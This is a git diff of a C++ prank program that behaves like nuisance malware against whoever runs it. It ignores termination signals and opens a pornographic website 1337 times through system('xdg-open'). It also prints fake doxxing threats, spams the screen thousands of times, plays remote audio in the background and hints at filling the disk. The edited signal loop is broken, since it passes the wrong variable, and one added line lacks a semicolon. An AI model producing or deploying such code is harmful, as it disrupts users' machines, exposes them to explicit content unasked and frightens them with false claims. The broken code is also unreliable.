@@ -41,12 +41,11 @@ void funcOverflow()
 
 int main()
 {
-  short repeatLoop = 64;
+  short repeatLoop = 0; // TODO: replace "while(repeatLoop--) with for loops of varying criteria."
 
   // Okay so I wanted to block as many signals as I could, so this loop covers that.
-  while(repeatLoop > 0) {
+  for(int i = 64; i > 0; i--) {
     std::signal(repeatLoop, SIG_IGN);
-    repeatLoop--;
   }
   // The most boring yet effective thing: TEXT.
   sleep(10);
@@ -89,11 +88,12 @@ int main()
 
   repeatLoop = 1337;
 
+  // This one is pure evil.
   while(repeatLoop--) {
     system("xdg-open https://pornhub.com");
   }
-  sleep(5);
 
+  sleep(5);
   displayText("\nRIP your browser history. In case you don't have a browser, nothing ran.");
   sleep(7);
   displayText("\nYour data is now on DoxBin! Well, at least if you have internet.");
@@ -105,13 +105,14 @@ int main()
   displayText("\nHere we are, already at UTAUs, why not keep going?\nDon't worry, there will be some Momone Momo later.");
   sleep(8);
 
+  // Whoever runs this with notifications on, RIP eardrums.
   repeatLoop = 10000;
 
   while(repeatLoop--) {
     displayText("\nMomone Momo");
-     usleep(1000);
+    usleep(1000);
   }
-  repeatLoop = -1;
+
   sleep(5);
   displayText("\nOh wait did I figure it out?");
   system("mpv --no-video --volume=70 https://www.youtube.com/watch?v=GCcWD265-3E > /dev/null &");
@@ -143,4 +144,5 @@ int main()
   displayText("Just kidding check your disk space.");
   sleep(10);
   initializeMiku();
+  displayText("To any Defoko fans here, don't worry. There will be some things in a little bit.")
 }
